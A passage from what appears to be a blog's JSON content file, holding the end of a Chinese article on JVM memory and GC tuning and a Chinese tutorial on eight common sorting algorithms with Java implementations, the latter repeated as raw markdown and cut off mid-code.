E74;&#x8F7B;&#x4EE3;&#x4F1A;&#x5EF6;&#x957F;&#x666E;&#x901A;GC&#x7684;&#x5468;&#x671F;&#xFF0C;&#x4F46;&#x4F1A;&#x589E;&#x52A0;&#x6BCF;&#x6B21;GC&#x7684;&#x65F6;&#x95F4;&#xFF1B;&#x5C0F;&#x7684;&#x5E74;&#x8001;&#x4EE3;&#x4F1A;&#x5BFC;&#x81F4;&#x66F4;&#x9891;&#x7E41;&#x7684;Full GC&#x3002;<br>&#xFF08;2&#xFF09;&#x66F4;&#x5C0F;&#x7684;&#x5E74;&#x8F7B;&#x4EE3;&#x5FC5;&#x7136;&#x5BFC;&#x81F4;&#x66F4;&#x5927;&#x5E74;&#x8001;&#x4EE3;&#xFF0C;&#x5C0F;&#x7684;&#x5E74;&#x8F7B;&#x4EE3;&#x4F1A;&#x5BFC;&#x81F4;&#x666E;&#x901A;GC&#x5F88;&#x9891;&#x7E41;&#xFF0C;&#x4F46;&#x6BCF;&#x6B21;&#x7684;GC&#x65F6;&#x95F4;&#x4F1A;&#x66F4;&#x77ED;&#xFF1B;&#x5927;&#x7684;&#x5E74;&#x8001;&#x4EE3;&#x4F1A;&#x51CF;&#x5C11;Full GC&#x7684;&#x9891;&#x7387;&#x3002;<br>&#xFF08;3&#xFF09;&#x5982;&#x4F55;&#x9009;&#x62E9;&#x5E94;&#x8BE5;&#x4F9D;&#x8D56;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5BF9;&#x8C61;&#x751F;&#x547D;&#x5468;&#x671F;&#x7684;&#x5206;&#x5E03;&#x60C5;&#x51B5;&#xFF1A;<br>&#x5982;&#x679C;&#x5E94;&#x7528;&#x5B58;&#x5728;&#x5927;&#x91CF;&#x7684;&#x4E34;&#x65F6;&#x5BF9;&#x8C61;&#xFF0C;&#x5E94;&#x8BE5;&#x9009;&#x62E9;&#x66F4;&#x5927;&#x7684;&#x5E74;&#x8F7B;&#x4EE3;&#xFF1B;<br>&#x5982;&#x679C;&#x5B58;&#x5728;&#x76F8;&#x5BF9;&#x8F83;&#x591A;&#x7684;&#x6301;&#x4E45;&#x5BF9;&#x8C61;&#xFF0C;&#x5E74;&#x8001;&#x4EE3;&#x5E94;&#x8BE5;&#x9002;&#x5F53;&#x589E;&#x5927;&#x3002;<br>&#x4F46;&#x5F88;&#x591A;&#x5E94;&#x7528;&#x90FD;&#x6CA1;&#x6709;&#x8FD9;&#x6837;&#x660E;&#x663E;&#x7684;&#x7279;&#x6027;&#xFF0C;&#x5728;&#x6289;&#x62E9;&#x65F6;&#x5E94;&#x8BE5;&#x6839;&#x636E;&#x4EE5;&#x4E0B;&#x4E24;&#x70B9;&#xFF1A;<br>&#xFF08;A&#xFF09;&#x672C;&#x7740;Full GC&#x5C3D;&#x91CF;&#x5C11;&#x7684;&#x539F;&#x5219;&#xFF0C;&#x8BA9;&#x5E74;&#x8001;&#x4EE3;&#x5C3D;&#x91CF;&#x7F13;&#x5B58;&#x5E38;&#x7528;&#x5BF9;&#x8C61;&#xFF0C;JVM&#x7684;&#x9ED8;&#x8BA4;&#x6BD4;&#x4F8B;1&#xFF1A;2&#x4E5F;&#x662F;&#x8FD9;&#x4E2A;&#x9053;&#x7406;<br>&#xFF08;B&#xFF09;&#x901A;&#x8FC7;&#x89C2;&#x5BDF;&#x5E94;&#x7528;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#xFF0C;&#x770B;&#x5176;&#x4ED6;&#x5728;&#x5CF0;&#x503C;&#x65F6;&#x5E74;&#x8001;&#x4EE3;&#x4F1A;&#x5360;&#x591A;&#x5C11;&#x5185;&#x5B58;&#xFF0C;&#x5728;&#x4E0D;&#x5F71;&#x54CD;Full GC&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x52A0;&#x5927;&#x5E74;&#x8F7B;&#x4EE3;&#xFF0C;&#x6BD4;&#x5982;&#x53EF;&#x4EE5;&#x628A;&#x6BD4;&#x4F8B;&#x63A7;&#x5236;&#x5728;1&#xFF1A;1&#x3002;&#x4F46;&#x5E94;&#x8BE5;&#x7ED9;&#x5E74;&#x8001;&#x4EE3;&#x81F3;&#x5C11;&#x9884;&#x7559;1/3&#x7684;&#x589E;&#x957F;&#x7A7A;&#x95F4;</p>\n</li>\n<li><p>&#x5728;&#x914D;&#x7F6E;&#x8F83;&#x597D;&#x7684;&#x673A;&#x5668;&#x4E0A;&#xFF08;&#x6BD4;&#x5982;&#x591A;&#x6838;&#x3001;&#x5927;&#x5185;&#x5B58;&#xFF09;&#xFF0C;&#x53EF;&#x4EE5;&#x4E3A;&#x5E74;&#x8001;&#x4EE3;&#x9009;&#x62E9;&#x5E76;&#x884C;&#x6536;&#x96C6;&#x7B97;&#x6CD5;&#xFF1A; -XX:+UseParallelOldGC &#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;Serial&#x6536;&#x96C6;</p>\n</li>\n<li><p>&#x7EBF;&#x7A0B;&#x5806;&#x6808;&#x7684;&#x8BBE;&#x7F6E;&#xFF1A;&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x9ED8;&#x8BA4;&#x4F1A;&#x5F00;&#x542F;1M&#x7684;&#x5806;&#x6808;&#xFF0C;&#x7528;&#x4E8E;&#x5B58;&#x653E;&#x6808;&#x5E27;&#x3001;&#x8C03;&#x7528;&#x53C2;&#x6570;&#x3001;&#x5C40;&#x90E8;&#x53D8;&#x91CF;&#x7B49;&#xFF0C;&#x5BF9;&#x5927;&#x591A;&#x6570;&#x5E94;&#x7528;&#x800C;&#x8A00;&#x8FD9;&#x4E2A;&#x9ED8;&#x8BA4;&#x503C;&#x592A;&#x4E86;&#xFF0C;&#x4E00;&#x822C;256K&#x5C31;&#x8DB3;&#x7528;&#x3002;&#x7406;&#x8BBA;&#x4E0A;&#xFF0C;&#x5728;&#x5185;&#x5B58;&#x4E0D;&#x53D8;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x51CF;&#x5C11;&#x6BCF;&#x4E2A;&#x7EBF;&#x7A0B;&#x7684;&#x5806;&#x6808;&#xFF0C;&#x53EF;&#x4EE5;&#x4EA7;&#x751F;&#x66F4;&#x591A;&#x7684;&#x7EBF;&#x7A0B;&#xFF0C;&#x4F46;&#x8FD9;&#x5B9E;&#x9645;&#x4E0A;&#x8FD8;&#x53D7;&#x9650;&#x4E8E;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x3002;</p>\n</li>\n<li><p>&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x7684;&#x53C2;&#x6570;&#x6253;Heap Dump&#x4FE1;&#x606F;<br>&#xFF08;1&#xFF09;-XX:HeapDumpPath<br>&#xFF08;2&#xFF09;-XX:+PrintGCDetails<br>&#xFF08;3&#xFF09;-XX:+PrintGCTimeStamps<br>&#xFF08;4&#xFF09;-Xloggc:/usr/aaa/dump/heap_trace.txt</p>\n</li>\n</ul>\n<p>&#x901A;&#x8FC7;&#x4E0B;&#x9762;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x63A7;&#x5236;OutOfMemoryError&#x65F6;&#x6253;&#x5370;&#x5806;&#x7684;&#x4FE1;&#x606F;<br>-XX:+HeapDumpOnOutOfMemoryError</p>\n<p>&#x8BF7;&#x770B;&#x4E00;&#x4E0B;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x7684;Java&#x53C2;&#x6570;&#x914D;&#x7F6E;&#xFF1A;&#xFF08;&#x670D;&#x52A1;&#x5668;&#xFF1A;Linux 64Bit&#xFF0C;8Core&#xD7;16G&#xFF09;<br> JAVA_OPTS=&#x201D;$JAVA_OPTS -server -Xms3G -Xmx3G -Xss256k -XX:PermSize=128m -XX:MaxPermSize=128m -XX:+UseParallelOldGC -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/usr/aaa/dump -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -Xloggc:/usr/aaa/dump/heap_trace.txt -XX:NewSize=1G -XX:MaxNewSize=1G&#x201D;</p>\n<p>&#x7ECF;&#x8FC7;&#x89C2;&#x5BDF;&#x8BE5;&#x914D;&#x7F6E;&#x975E;&#x5E38;&#x7A33;&#x5B9A;&#xFF0C;&#x6BCF;&#x6B21;&#x666E;&#x901A;GC&#x7684;&#x65F6;&#x95F4;&#x5728;10ms&#x5DE6;&#x53F3;&#xFF0C;Full GC&#x57FA;&#x672C;&#x4E0D;&#x53D1;&#x751F;&#xFF0C;&#x6216;&#x9694;&#x5F88;&#x957F;&#x5F88;&#x957F;&#x7684;&#x65F6;&#x95F4;&#x624D;&#x53D1;&#x751F;&#x4E00;&#x6B21;</p>\n<p>&#x901A;&#x8FC7;&#x5206;&#x6790;dump&#x6587;&#x4EF6;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x6BCF;&#x4E2A;1&#x5C0F;&#x65F6;&#x90FD;&#x4F1A;&#x53D1;&#x751F;&#x4E00;&#x6B21;Full GC&#xFF0C;&#x7ECF;&#x8FC7;&#x591A;&#x65B9;&#x6C42;&#x8BC1;&#xFF0C;&#x53EA;&#x8981;&#x5728;JVM&#x4E2D;&#x5F00;&#x542F;&#x4E86;JMX&#x670D;&#x52A1;&#xFF0C;JMX&#x5C06;&#x4F1A;1&#x5C0F;&#x65F6;&#x6267;&#x884C;&#x4E00;&#x6B21;Full GC&#x4EE5;&#x6E05;&#x9664;&#x5F15;&#x7528;&#xFF0C;&#x5173;&#x4E8E;&#x8FD9;&#x70B9;&#x8BF7;&#x53C2;&#x8003;&#x9644;&#x4EF6;&#x6587;&#x6863;&#x3002;</p>\n<h4 id=\"4-&#x7A0B;&#x5E8F;&#x7B97;&#x6CD5;&#x8C03;&#x4F18;&#xFF1A;&#x672C;&#x6B21;&#x4E0D;&#x4F5C;&#x4E3A;&#x91CD;&#x70B9;\"><a href=\"#4-&#x7A0B;&#x5E8F;&#x7B97;&#x6CD5;&#x8C03;&#x4F18;&#xFF1A;&#x672C;&#x6B21;&#x4E0D;&#x4F5C;&#x4E3A;&#x91CD;&#x70B9;\" class=\"headerlink\" title=\"4.&#x7A0B;&#x5E8F;&#x7B97;&#x6CD5;&#x8C03;&#x4F18;&#xFF1A;&#x672C;&#x6B21;&#x4E0D;&#x4F5C;&#x4E3A;&#x91CD;&#x70B9;\"></a>4.&#x7A0B;&#x5E8F;&#x7B97;&#x6CD5;&#x8C03;&#x4F18;&#xFF1A;&#x672C;&#x6B21;&#x4E0D;&#x4F5C;&#x4E3A;&#x91CD;&#x70B9;</h4>"},{"title":"Java常用算法","date":"2016-07-29T10:53:00.000Z","toc":false,"_content":"\n### 常见排序之间的关系:\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/1.png)\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/2.png)\n\n<!-- more -->\n\n### 1、直接插入排序\n\n（1）基本思想：在要排序的一组数中，假设前面(n-1)[n>=2] 个数已经是排\n好顺序的，现在要把第n个数插到前面的有序数中，使得这n个数\n也是排好顺序的。如此反复循环，直到全部排好顺序。\n（2）实例\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/3.png)\n（3）用java实现\n```bash\n package com.njue;  \n\npublic class insertSort {  \npublic insertSort(){  \n    inta[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  \n    int temp=0;  \n    for(int i=1;i<a.length;i++){  \n       int j=i-1;  \n       temp=a[i];  \n       for(;j>=0&&temp<a[j];j--){  \n       a[j+1]=a[j];                       //将大于temp的值整体后移一个单位  \n       }  \n       a[j+1]=temp;  \n    }  \n    for(int i=0;i<a.length;i++)  \n       System.out.println(a[i]);  \n}  \n}\n```\n\n### 2、希尔排序（最小增量排序）\n\n（1）基本思想：算法先将要排序的一组数按某个增量d（n/2,n为要排序数的个数）分成若干组，每组中记录的下标相差d.对每组中全部元素进行直接插入排序，然后再用一个较小的增量（d/2）对它进行分组，在每组中再进行直接插入排序。当增量减到1时，进行直接插入排序后，排序完成。\n（2）实例：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/4.png)\n（3）用java实现\n```bash\npublic class shellSort {  \npublic  shellSort(){  \n    int a[]={1,54,6,3,78,34,12,45,56,100};  \n    double d1=a.length;  \n    int temp=0;  \n    while(true){  \n        d1= Math.ceil(d1/2);  \n        int d=(int) d1;  \n        for(int x=0;x<d;x++){  \n            for(int i=x+d;i<a.length;i+=d){  \n                int j=i-d;  \n                temp=a[i];  \n                for(;j>=0&&temp<a[j];j-=d){  \n                a[j+d]=a[j];  \n                }  \n                a[j+d]=temp;  \n            }  \n        }  \n        if(d==1)  \n            break;  \n    }  \n    for(int i=0;i<a.length;i++)  \n        System.out.println(a[i]);  \n}  \n}\n```\n### 3、简单选择排序\n\n（1）基本思想：在要排序的一组数中，选出最小的一个数与第一个位置的数交换；\n然后在剩下的数当中再找最小的与第二个位置的数交换，如此循环到倒数第二个数和最后一个数比较为止。\n（2）实例：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/5.png)\n（3）用java实现\n```bash\npublic class selectSort {  \n    public selectSort(){  \n        int a[]={1,54,6,3,78,34,12,45};  \n        int position=0;  \n        for(int i=0;i<a.length;i++){  \n\n            int j=i+1;  \n            position=i;  \n            int temp=a[i];  \n            for(;j<a.length;j++){  \n            if(a[j]<temp){  \n                temp=a[j];  \n                position=j;  \n            }  \n            }  \n            a[position]=a[i];  \n            a[i]=temp;  \n        }  \n        for(int i=0;i<a.length;i++)  \n            System.out.println(a[i]);  \n    }  \n}\n```\n### 4、堆排序\n\n（1）基本思想：堆排序是一种树形选择排序，是对直接选择排序的有效改进。\n堆的定义如下：具有n个元素的序列（h1,h2,…,hn),当且仅当满足（hi>=h2i,hi>=2i+1）或（hi<=h2i,hi<=2i+1） (i=1,2,…,n/2)时称之为堆。在这里只讨论满足前者条件的堆。由堆的定义可以看出，堆顶元素（即第一个元素）必为最大项（大顶堆）。完全二叉树可以很直观地表示堆的结构。堆顶为根，其它为左子树、右子树。初始时把要排序的数的序列看作是一棵顺序存储的二叉树，调整它们的存储序，使之成为一个堆，这时堆的根节点的数最大。然后将根节点与堆的最后一个节点交换。然后对前面(n-1)个数重新调整使之成为堆。依此类推，直到只有两个节点的堆，并对它们作交换，最后得到有n个节点的有序序列。从算法描述来看，堆排序需要两个过程，一是建立堆，二是堆顶与堆的最后一个元素交换位置。所以堆排序有两个函数组成。一是建堆的渗透函数，二是反复调用渗透函数实现排序的函数。\n（2）实例：\n初始序列：46,79,56,38,40,84\n建堆：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/6.png)\n交换，从堆中踢出最大数\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/7.png)\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/8.png)\n依次类推：最后堆中剩余的最后两个结点交换，踢出一个，排序完成。\n（3）用java实现\n```bash\nimport java.util.Arrays;  \n\npublic class HeapSort {  \n     int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  \n    public  HeapSort(){  \n        heapSort(a);  \n    }  \n    public  void heapSort(int[] a){  \n        System.out.println(\"开始排序\");  \n        int arrayLength=a.length;  \n        //循环建堆  \n        for(int i=0;i<arrayLength-1;i++){  \n            //建堆  \n\n      buildMaxHeap(a,arrayLength-1-i);  \n            //交换堆顶和最后一个元素  \n            swap(a,0,arrayLength-1-i);  \n            System.out.println(Arrays.toString(a));  \n        }  \n    }  \n\n    private  void swap(int[] data, int i, int j) {  \n        // TODO Auto-generated method stub  \n        int tmp=data[i];  \n        data[i]=data[j];  \n        data[j]=tmp;  \n    }  \n    //对data数组从0到lastIndex建大顶堆  \n    private void buildMaxHeap(int[] data, int lastIndex) {  \n        // TODO Auto-generated method stub  \n        //从lastIndex处节点（最后一个节点）的父节点开始  \n        for(int i=(lastIndex-1)/2;i>=0;i--){  \n            //k保存正在判断的节点  \n            int k=i;  \n            //如果当前k节点的子节点存在  \n            while(k*2+1<=lastIndex){  \n                //k节点的左子节点的索引  \n                int biggerIndex=2*k+1;  \n                //如果biggerIndex小于lastIndex，即biggerIndex+1代表的k节点的右子节点存在  \n                if(biggerIndex<lastIndex){  \n                    //若果右子节点的值较大  \n                    if(data[biggerIndex]<data[biggerIndex+1]){  \n                        //biggerIndex总是记录较大子节点的索引  \n                        biggerIndex++;  \n                    }  \n                }  \n                //如果k节点的值小于其较大的子节点的值  \n                if(data[k]<data[biggerIndex]){  \n                    //交换他们  \n                    swap(data,k,biggerIndex);  \n                    //将biggerIndex赋予k，开始while循环的下一次循环，重新保证k节点的值大于其左右子节点的值  \n                    k=biggerIndex;  \n                }else{  \n                    break;  \n                }  \n            }\n        }\n    }\n}\n```\n\n### 5、冒泡排序\n\n（1）基本思想：在要排序的一组数中，对当前还未排好序的范围内的全部数，自上而下对相邻的两个数依次进行比较和调整，让较大的数往下沉，较小的往上冒。即：每当两相邻的数比较后发现它们的排序与排序要求相反时，就将它们互换。\n（2）实例：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/9.png)\n（3）用java实现\n```bash\npublic class bubbleSort {  \npublic  bubbleSort(){  \n     int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  \n    int temp=0;  \n    for(int i=0;i<a.length-1;i++){  \n        for(int j=0;j<a.length-1-i;j++){  \n        if(a[j]>a[j+1]){  \n            temp=a[j];  \n            a[j]=a[j+1];  \n            a[j+1]=temp;  \n        }  \n        }  \n    }  \n    for(int i=0;i<a.length;i++)  \n    System.out.println(a[i]);     \n}  \n}\n```\n\n### 6、快速排序\n\n（1）基本思想：选择一个基准元素,通常选择第一个元素或者最后一个元素,通过一趟扫描，将待排序列分成两部分,一部分比基准元素小,一部分大于等于基准元素,此时基准元素在其排好序后的正确位置,然后再用同样的方法递归地排序划分的两部分。\n（2）实例：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/10.png)\n（3）用java实现\n```bash\npublic class quickSort {  \n  int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  \npublic  quickSort(){  \n    quick(a);  \n    for(int i=0;i<a.length;i++)  \n        System.out.println(a[i]);  \n}  \npublic int getMiddle(int[] list, int low, int high) {     \n            int tmp = list[low];    //数组的第一个作为中轴     \n            while (low < high) {     \n                while (low < high && list[high] >= tmp) {     \n\n      high--;     \n                }     \n                list[low] = list[high];   //比中轴小的记录移到低端     \n                while (low < high && list[low] <= tmp) {     \n                    low++;     \n                }     \n                list[high] = list[low];   //比中轴大的记录移到高端     \n            }     \n           list[low] = tmp;              //中轴记录到尾     \n            return low;                   //返回中轴的位置     \n        }    \npublic void _quickSort(int[] list, int low, int high) {     \n            if (low < high) {     \n               int middle = getMiddle(list, low, high);  //将list数组进行一分为二     \n                _quickSort(list, low, middle - 1);        //对低字表进行递归排序     \n               _quickSort(list, middle + 1, high);       //对高字表进行递归排序     \n            }     \n        }   \npublic void quick(int[] a2) {     \n            if (a2.length > 0) {    //查看数组是否为空     \n                _quickSort(a2, 0, a2.length - 1);     \n        }     \n       }   \n}\n```\n\n### 7、归并排序\n\n（1）基本排序：归并（Merge）排序法是将两个（或两个以上）有序表合并成一个新的有序表，即把待排序序列分为若干个子序列，每个子序列是有序的。然后再把有序子序列合并为整体有序序列。\n（2）实例：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/11.png)\n（3）用java实现\n```bash\nimport java.util.Arrays;  \n\npublic class mergingSort {  \nint a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  \npublic  mergingSort(){  \n    sort(a,0,a.length-1);  \n    for(int i=0;i<a.length;i++)  \n        System.out.println(a[i]);  \n}  \npublic void sort(int[] data, int left, int right) {  \n    // TODO Auto-generated method stub  \n    if(left<right){  \n        //找出中间索引  \n        int center=(left+right)/2;  \n        //对左边数组进行递归  \n        sort(data,left,center);  \n        //对右边数组进行递归  \n        sort(data,center+1,right);  \n        //合并  \n        merge(data,left,center,right);  \n\n    }  \n}  \npublic void merge(int[] data, int left, int center, int right) {  \n    // TODO Auto-generated method stub  \n    int [] tmpArr=new int[data.length];  \n    int mid=center+1;  \n    //third记录中间数组的索引  \n    int third=left;  \n    int tmp=left;  \n    while(left<=center&&mid<=right){  \n\n   //从两个数组中取出最小的放入中间数组  \n        if(data[left]<=data[mid]){  \n            tmpArr[third++]=data[left++];  \n        }else{  \n            tmpArr[third++]=data[mid++];  \n        }  \n    }  \n    //剩余部分依次放入中间数组  \n    while(mid<=right){  \n        tmpArr[third++]=data[mid++];  \n    }  \n    while(left<=center){  \n        tmpArr[third++]=data[left++];  \n    }  \n    //将中间数组中的内容复制回原数组  \n    while(tmp<=right){  \n        data[tmp]=tmpArr[tmp++];  \n    }  \n    System.out.println(Arrays.toString(data));  \n}  \n\n}\n```\n\n### 8、基数排序\n\n（1）基本思想：将所有待比较数值（正整数）统一为同样的数位长度，数位较短的数前面补零。然后，从最低位开始，依次进行一次排序。这样从最低位排序一直到最高位排序完成以后,数列就变成一个有序序列。\n（2）实例：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/12.png)\n（3）用java实现\n```bash\nimport java.util.ArrayList;  \nimport java.util.List;  \n\npublic class radixSort {  \n    int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,101,56,17,18,23,34,15,35,25,53,51};  \npublic radixSort(){  \n    sort(a);  \n    for(int i=0;i<a.length;i++)  \n        System.out.println(a[i]);  \n}  \npublic  void sort(int[] array){     \n\n            //首先确定排序的趟数;     \n        int max=array[0];     \n        for(int i=1;i<array.length;i++){     \n               if(array[i]>max){     \n               max=array[i];     \n               }     \n            }     \n\n    int time=0;     \n           //判断位数;     \n            while(max>0){     \n               max/=10;     \n                time++;     \n            }     \n\n        //建立10个队列;     \n            List<ArrayList> queue=new ArrayList<ArrayList>();     \n            for(int i=0;i<10;i++){     \n                ArrayList<Integer> queue1=new ArrayList<Integer>();   \n                queue.add(queue1);     \n        }     \n\n            //进行time次分配和收集;     \n            for(int i=0;i<time;i++){     \n\n                //分配数组元素;     \n               for(int j=0;j<array.length;j++){     \n                    //得到数字的第time+1位数;   \n                   int x=array[j]%(int)Math.pow(10, i+1)/(int)Math.pow(10, i);  \n                   ArrayList<Integer> queue2=queue.get(x);  \n                   queue2.add(array[j]);  \n                   queue.set(x, queue2);  \n            }     \n                int count=0;//元素计数器;     \n            //收集队列元素;     \n                for(int k=0;k<10;k++){   \n                while(queue.get(k).size()>0){  \n                    ArrayList<Integer> queue3=queue.get(k);  \n                        array[count]=queue3.get(0);     \n                        queue3.remove(0);  \n                    count++;  \n              }     \n            }     \n          }     \n\n   }    \n\n}\n```\n","source":"_posts/Java常用算法.md","raw":"---\ntitle: Java常用算法\ncategories:\n  - 算法及理论\ndate: 2016-7-29 18:53:00\ntoc: false\n\n---\n\n### 常见排序之间的关系:\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/1.png)\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/2.png)\n\n<!-- more -->\n\n### 1、直接插入排序\n\n（1）基本思想：在要排序的一组数中，假设前面(n-1)[n>=2] 个数已经是排\n好顺序的，现在要把第n个数插到前面的有序数中，使得这n个数\n也是排好顺序的。如此反复循环，直到全部排好顺序。\n（2）实例\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/3.png)\n（3）用java实现\n```bash\n package com.njue;  \n\npublic class insertSort {  \npublic insertSort(){  \n    inta[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  \n    int temp=0;  \n    for(int i=1;i<a.length;i++){  \n       int j=i-1;  \n       temp=a[i];  \n       for(;j>=0&&temp<a[j];j--){  \n       a[j+1]=a[j];                       //将大于temp的值整体后移一个单位  \n       }  \n       a[j+1]=temp;  \n    }  \n    for(int i=0;i<a.length;i++)  \n       System.out.println(a[i]);  \n}  \n}\n```\n\n### 2、希尔排序（最小增量排序）\n\n（1）基本思想：算法先将要排序的一组数按某个增量d（n/2,n为要排序数的个数）分成若干组，每组中记录的下标相差d.对每组中全部元素进行直接插入排序，然后再用一个较小的增量（d/2）对它进行分组，在每组中再进行直接插入排序。当增量减到1时，进行直接插入排序后，排序完成。\n（2）实例：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/4.png)\n（3）用java实现\n```bash\npublic class shellSort {  \npublic  shellSort(){  \n    int a[]={1,54,6,3,78,34,12,45,56,100};  \n    double d1=a.length;  \n    int temp=0;  \n    while(true){  \n        d1= Math.ceil(d1/2);  \n        int d=(int) d1;  \n        for(int x=0;x<d;x++){  \n            for(int i=x+d;i<a.length;i+=d){  \n                int j=i-d;  \n                temp=a[i];  \n                for(;j>=0&&temp<a[j];j-=d){  \n                a[j+d]=a[j];  \n                }  \n                a[j+d]=temp;  \n            }  \n        }  \n        if(d==1)  \n            break;  \n    }  \n    for(int i=0;i<a.length;i++)  \n        System.out.println(a[i]);  \n}  \n}\n```\n### 3、简单选择排序\n\n（1）基本思想：在要排序的一组数中，选出最小的一个数与第一个位置的数交换；\n然后在剩下的数当中再找最小的与第二个位置的数交换，如此循环到倒数第二个数和最后一个数比较为止。\n（2）实例：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/5.png)\n（3）用java实现\n```bash\npublic class selectSort {  \n    public selectSort(){  \n        int a[]={1,54,6,3,78,34,12,45};  \n        int position=0;  \n        for(int i=0;i<a.length;i++){  \n\n            int j=i+1;  \n            position=i;  \n            int temp=a[i];  \n            for(;j<a.length;j++){  \n            if(a[j]<temp){  \n                temp=a[j];  \n                position=j;  \n            }  \n            }  \n            a[position]=a[i];  \n            a[i]=temp;  \n        }  \n        for(int i=0;i<a.length;i++)  \n            System.out.println(a[i]);  \n    }  \n}\n```\n### 4、堆排序\n\n（1）基本思想：堆排序是一种树形选择排序，是对直接选择排序的有效改进。\n堆的定义如下：具有n个元素的序列（h1,h2,…,hn),当且仅当满足（hi>=h2i,hi>=2i+1）或（hi<=h2i,hi<=2i+1） (i=1,2,…,n/2)时称之为堆。在这里只讨论满足前者条件的堆。由堆的定义可以看出，堆顶元素（即第一个元素）必为最大项（大顶堆）。完全二叉树可以很直观地表示堆的结构。堆顶为根，其它为左子树、右子树。初始时把要排序的数的序列看作是一棵顺序存储的二叉树，调整它们的存储序，使之成为一个堆，这时堆的根节点的数最大。然后将根节点与堆的最后一个节点交换。然后对前面(n-1)个数重新调整使之成为堆。依此类推，直到只有两个节点的堆，并对它们作交换，最后得到有n个节点的有序序列。从算法描述来看，堆排序需要两个过程，一是建立堆，二是堆顶与堆的最后一个元素交换位置。所以堆排序有两个函数组成。一是建堆的渗透函数，二是反复调用渗透函数实现排序的函数。\n（2）实例：\n初始序列：46,79,56,38,40,84\n建堆：\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/6.png)\n交换，从堆中踢出最大数\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/7.png)\n![](http://7xvfir.com1.z0.glb.clouddn.com/Java%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/8.png)\n依次类推：最后堆中剩余的最后两个结点交换，踢出一个，排序完成。\n（3）用java实现\n```bash\nimport java.util.Arrays;  \n\npublic class HeapSort {  \n     int a[]={49,38,65,97,76,13,27,49,78,34,12,64,5,4,62,99,98,54,56,17,18,23,34,15,35,25,53,51};  \n    public  HeapSort(){  \n        heapSort(a);  \n    }  \n    public  void heapSort(int[] a){  \n        System.out.println(\"开始排序\");  \n        int arrayLength=a.length;  \n        //循环建堆  \n        for(int i=0;i<arrayLength-1;i++){  \n            //建堆  \n\n      buildMaxHeap(a,arrayLength-1-i);  \n            //交换堆顶和最后一个元素  \n            swap(a,0,arrayLength-1-i);  \n            System.out.println(Arrays.toString(a));  \n        }  \n    }  \n\n    private  void swap(int[] data, int i, int j) {  \n        // TODO Auto-generated method stub  \n        int tmp=data[i];  \n        data[i]=data[j];  \n        data[j]=tmp;  \n    }  \n    //对data数组从0到lastIndex建大顶堆  \n    private void buildMaxHeap(int[] data, int lastIndex) {  \n        // TODO Auto-generated method stub  \n        //从lastIndex处节点（最后一个节点）的父节点开始  \n        for(int 